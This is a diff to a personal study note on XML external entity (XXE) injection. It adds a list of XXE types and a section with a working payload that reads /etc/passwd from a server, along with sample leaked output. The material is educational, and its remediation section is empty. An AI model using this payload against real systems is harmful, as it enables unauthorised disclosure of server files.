@@ -4,7 +4,7 @@ XXE injection allows an attacker to interfere with processing XML data of applic
 
 Attacker can view internal file's of applicatgion server and interact with back end systems.
 
-- ***XML (extensible markup language):*** designed for storing and transporting data. XML uses a tree structure of tags and data.
+- ***XML (Extensible markup language):*** designed for storing and transporting data. XML uses a tree structure of tags and data.
 - ***XML Entities*** is a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities &lt; and &gt; represent the characters < and >.
 - ***DTD (Document type definition):*** define the structure of an XML document, it can contain types of data values and other items. 
 
@@ -27,7 +27,38 @@ Like XXE are a type of custom XML entity whose defined values are loaded from ou
 
 ## Types of XXE
 
+- Internal DTD
+- External DTD
+
+
 ## How to find and test XXE
+1. Exploiting XXE to retrieve files
+
+ To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:
+
+   1. Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
+   2. Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.
+
+Example: Application checks for the stock level of a product by submitting the following XML to the server
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<stocCheck><productId>381</productId></stockCheck>
+```
+
+The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the /etc/passwd file by submitting the following XXE payload: 
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+```
+This XXE payload defines an external entity &xxe; whose value is the contents of the /etc/passwd file and uses the entity within the productId value. This causes the application's response to include the contents of the file:
+
+```
+Invalid product ID: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+```
 
 ## Remediation of XXE
 
